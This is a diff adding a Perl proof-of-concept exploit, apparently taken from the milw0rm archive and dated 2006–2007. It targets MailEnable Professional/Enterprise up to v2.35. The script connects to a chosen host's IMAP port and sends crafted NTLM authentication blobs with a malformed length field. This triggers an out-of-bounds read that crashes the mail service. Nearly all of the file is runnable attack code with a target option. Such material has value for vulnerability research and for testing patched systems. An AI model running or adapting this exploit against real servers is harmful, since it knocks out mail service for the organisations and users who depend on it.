@@ -1,0 +1,79 @@
+#!/usr/bin/perl
+#
+# maildisable-v5.pl
+#
+# Mail Enable Professional/Enterprise <=v2.35 (win32)
+# by mu-b - Wed Nov 29 2006
+#
+# - Tested on: Mail Enable Professional v2.32 (win32) - with HOTFIX
+#              Mail Enable Professional v2.33 (win32)
+#              Mail Enable Professional v2.34 (win32)
+#              Mail Enable Professional v2.35 (win32)
+#
+# out of bounds read == DoS
+#
+########
+
+use Getopt::Std; getopts('t:', \%arg);
+use Socket;
+use MIME::Base64;
+
+&print_header;
+
+my $target;
+
+if (defined($arg{'t'})) { $target = $arg{'t'} }
+if (!(defined($target))) { &usage; }
+
+my $imapd_port = 143;
+my $send_delay = 2;
+
+my $PAD = 'A';
+
+if (connect_host($target, $imapd_port)) {
+    print("-> * Connected\n");
+    send(SOCKET, "1 AUTHENTICATE NTLM\r\n", 0);
+    sleep($send_delay);
+
+    $buf = ($PAD x 12).
+           "\xfa\xff\xff\xff".
+           ($PAD x 12);
+    send(SOCKET, encode_base64($buf)."\r\n", 0);
+    sleep($send_delay);
+
+    $buf = ($PAD x 28).
+           "\x00\x01".
+           ($PAD x 2).
+           "\xef\xbe\xad\xde";
+    send(SOCKET, encode_base64($buf)."\r\n", 0);
+    sleep($send_delay);
+
+    print("-> * Successfully sent payload!\n");
+}
+
+sub print_header {
+    print("MailEnable Pro <=v2.36 DoS POC\n");
+    print("by: <mu-b\@digit-labs.org>\n\n");
+}
+
+sub usage {
+  print(qq(Usage: $0 -t <hostname>
+
+     -t <hostname>    : hostname to test
+));
+
+    exit(1);
+}
+
+sub connect_host {
+    ($target, $port) = @_;
+    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
+    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
+    $proto  = getprotobyname('tcp')              || die("Error: $!\n");
+
+    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+    connect(SOCKET, $paddr)                      || die("Error: $!\n");
+    return(1338);
+}
+
+# milw0rm.com [2007-02-14]
